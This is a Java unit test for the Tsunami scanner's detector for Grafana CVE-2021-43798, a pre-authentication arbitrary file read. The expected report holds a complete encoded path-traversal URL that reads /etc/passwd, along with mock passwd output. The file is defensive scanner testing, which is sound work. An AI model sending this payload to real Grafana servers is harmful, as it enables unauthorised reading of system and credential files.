/*
 * Copyright 2021 Google LLC
 *
 * Licensed under the Apache License, Version 2.0 (the "License");
 * you may not use this file except in compliance with the License.
 * You may obtain a copy of the License at
 *
 * http://www.apache.org/licenses/LICENSE-2.0
 *
 * Unless required by applicable law or agreed to in writing, software
 * distributed under the License is distributed on an "AS IS" BASIS,
 * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 * See the License for the specific language governing permissions and
 * limitations under the License.
 */
package com.google.tsunami.plugins.detectors.grafana;

import static com.google.common.truth.Truth.assertThat;
import static com.google.tsunami.common.data.NetworkEndpointUtils.forHostnameAndPort;

import com.google.common.collect.ImmutableList;
import com.google.inject.Guice;
import com.google.protobuf.util.Timestamps;
import com.google.tsunami.common.net.http.HttpClientModule;
import com.google.tsunami.common.net.http.HttpStatus;
import com.google.tsunami.common.time.testing.FakeUtcClock;
import com.google.tsunami.common.time.testing.FakeUtcClockModule;
import com.google.tsunami.proto.AdditionalDetail;
import com.google.tsunami.proto.DetectionReport;
import com.google.tsunami.proto.DetectionReportList;
import com.google.tsunami.proto.DetectionStatus;
import com.google.tsunami.proto.NetworkService;
import com.google.tsunami.proto.Severity;
import com.google.tsunami.proto.Software;
import com.google.tsunami.proto.TargetInfo;
import com.google.tsunami.proto.TextData;
import com.google.tsunami.proto.TransportProtocol;
import com.google.tsunami.proto.Vulnerability;
import com.google.tsunami.proto.VulnerabilityId;
import java.io.IOException;
import java.time.Instant;
import javax.inject.Inject;
import okhttp3.mockwebserver.Dispatcher;
import okhttp3.mockwebserver.MockResponse;
import okhttp3.mockwebserver.MockWebServer;
import okhttp3.mockwebserver.RecordedRequest;
import org.junit.After;
import org.junit.Before;
import org.junit.Test;
import org.junit.runner.RunWith;
import org.junit.runners.JUnit4;

/** Unit tests for {@link GrafanaArbitraryFileReadingDetector}. */
@RunWith(JUnit4.class)
public final class GrafanaArbitraryFileReadingDetectorTest {

  private final FakeUtcClock fakeUtcClock =
      FakeUtcClock.create().setNow(Instant.parse("2020-01-01T00:00:00.00Z"));

  @Inject private GrafanaArbitraryFileReadingDetector detector;

  private MockWebServer mockWebServer;
  private NetworkService grafanaService;

  @Before
  public void setUp() {
    mockWebServer = new MockWebServer();
    grafanaService =
        NetworkService.newBuilder()
            .setNetworkEndpoint(
                forHostnameAndPort(mockWebServer.getHostName(), mockWebServer.getPort()))
            .setTransportProtocol(TransportProtocol.TCP)
            .setSoftware(Software.newBuilder().setName("Grafana"))
            .setServiceName("http")
            .build();

    Guice.createInjector(
            new FakeUtcClockModule(fakeUtcClock),
            new HttpClientModule.Builder().build(),
            new GrafanaArbitraryFileReadingDetectorBootstrapModule())
        .injectMembers(this);
  }

  @After
  public void tearDown() throws IOException {
    mockWebServer.shutdown();
  }

  @Test
  public void detect_whenVulnerable_returnsVulnerability() {
    mockWebServer.setDispatcher(new VulnerableEndpointDispatcher());

    DetectionReportList detectionReports =
        detector.detect(TargetInfo.getDefaultInstance(), ImmutableList.of(grafanaService));
    assertThat(detectionReports.getDetectionReportsList())
        .containsExactly(
            DetectionReport.newBuilder()
                .setTargetInfo(TargetInfo.getDefaultInstance())
                .setNetworkService(grafanaService)
                .setDetectionTimestamp(
                    Timestamps.fromMillis(Instant.now(fakeUtcClock).toEpochMilli()))
                .setDetectionStatus(DetectionStatus.VULNERABILITY_VERIFIED)
                .setVulnerability(
                    Vulnerability.newBuilder()
                        .setMainId(
                            VulnerabilityId.newBuilder()
                                .setPublisher("TSUNAMI_COMMUNITY")
                                .setValue("CVE_2021_43798"))
                        .setSeverity(Severity.HIGH)
                        .setTitle(
                            "Grafana Pre-Auth Arbitrary File Reading vulnerability"
                                + " (CVE_2021_43798)")
                        .setDescription(
                            "In Grafana 8.0.0 to 8.3.0, there is an endpoint that can be "
                                + "accessed without authentication. This endpoint has a directory "
                                + "traversal vulnerability, and any user can read any file on the "
                                + "server without authentication, causing information leakage.")
                        .setRecommendation("Update to 8.3.1 version or later.")
                        .addAdditionalDetails(
                            AdditionalDetail.newBuilder()
                                .setTextData(
                                    TextData.newBuilder()
                                        .setText(
                                            "Vulnerable target:\n"
                                                + mockWebServer.url("/")
                                                + "public/plugins/annolist/..%2F..%2F.."
                                                + "%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F.."
                                                + "%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F.."
                                                + "%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F.."
                                                + "%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F.."
                                                + "%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F.."
                                                + "%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F.."
                                                + "%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F.."
                                                + "%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F.."
                                                + "%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F.."
                                                + "%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F.."
                                                + "%2F..%2F..%2F..%2Fetc%2Fpasswd\n\n"
                                                + "Response:\n"
                                                + "200 Ok\n"
                                                + "Content-Length: 259\n\n"
                                                + "root:x:0:0:root:/root:/bin/ash\n"
                                                + "bin:x:1:1:bin:/bin:/sbin/nologin\n"
                                                + "daemon:x:2:2:daemon:/sbin:/sbin/nologin\n"
                                                + "adm:x:3:4:adm:/var/adm:/sbin/nologin\n"
                                                + "lp:x:4:7:lp:/var/spool/lpd:/sbin/nologin\n"
                                                + "sync:x:5:0:sync:/sbin:/bin/sync\n"
                                                + "shutdown:x:6:0:shutdown:/sbin:"
                                                + "/sbin/shutdown\n"))))
                .build());
    assertThat(mockWebServer.getRequestCount()).isEqualTo(1);
  }

  @Test
  public void detect_whenNoVulnerable_returnsNoFinding() {
    mockWebServer.setDispatcher(new SafeEndpointDispatcher());

    DetectionReportList detectionReports =
        detector.detect(TargetInfo.getDefaultInstance(), ImmutableList.of(grafanaService));
    assertThat(detectionReports.getDetectionReportsList()).isEmpty();
    assertThat(mockWebServer.getRequestCount()).isEqualTo(42);
  }

  private static final class VulnerableEndpointDispatcher extends Dispatcher {

    @Override
    public MockResponse dispatch(RecordedRequest recordedRequest) {
      return new MockResponse()
          .setResponseCode(HttpStatus.OK.code())
          .setBody(
              "root:x:0:0:root:/root:/bin/ash\n"
                  + "bin:x:1:1:bin:/bin:/sbin/nologin\n"
                  + "daemon:x:2:2:daemon:/sbin:/sbin/nologin\n"
                  + "adm:x:3:4:adm:/var/adm:/sbin/nologin\n"
                  + "lp:x:4:7:lp:/var/spool/lpd:/sbin/nologin\n"
                  + "sync:x:5:0:sync:/sbin:/bin/sync\n"
                  + "shutdown:x:6:0:shutdown:/sbin:/sbin/shutdown\n");
    }
  }

  private static final class SafeEndpointDispatcher extends Dispatcher {

    @Override
    public MockResponse dispatch(RecordedRequest recordedRequest) {
      return new MockResponse().setResponseCode(HttpStatus.NOT_FOUND.code());
    }
  }
}
